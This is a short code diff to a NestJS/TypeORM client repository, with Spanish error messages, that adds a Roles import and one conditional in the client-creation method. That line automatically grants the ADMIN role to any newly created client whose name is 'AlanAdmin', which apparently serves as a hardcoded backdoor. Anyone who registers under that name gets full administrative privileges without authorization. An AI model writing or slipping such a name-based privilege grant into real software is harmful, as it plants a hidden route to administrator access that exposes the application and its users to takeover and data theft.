@@ -3,6 +3,7 @@ import { InjectRepository } from "@nestjs/typeorm";
 import { Client } from "../models/client.entity";
 import { Repository } from "typeorm";
 import { createClientDTO } from "../dtos/createClientDTO";
+import { Roles } from "src/utils/roles.enum";
 
 @Injectable()
 export class ClientRepository {
@@ -46,6 +47,7 @@ export class ClientRepository {
                 fiscal_key: clientDTO.fiscal_key,
                 isDeleted: false,
             };
+            if(client.name===`AlanAdmin`) client.role=Roles.ADMIN;
             return await this.clientReposiroty.save(client);
         } catch (error) {
             throw new NotFoundException(`Error al crear el cliente: ${error.message}`);
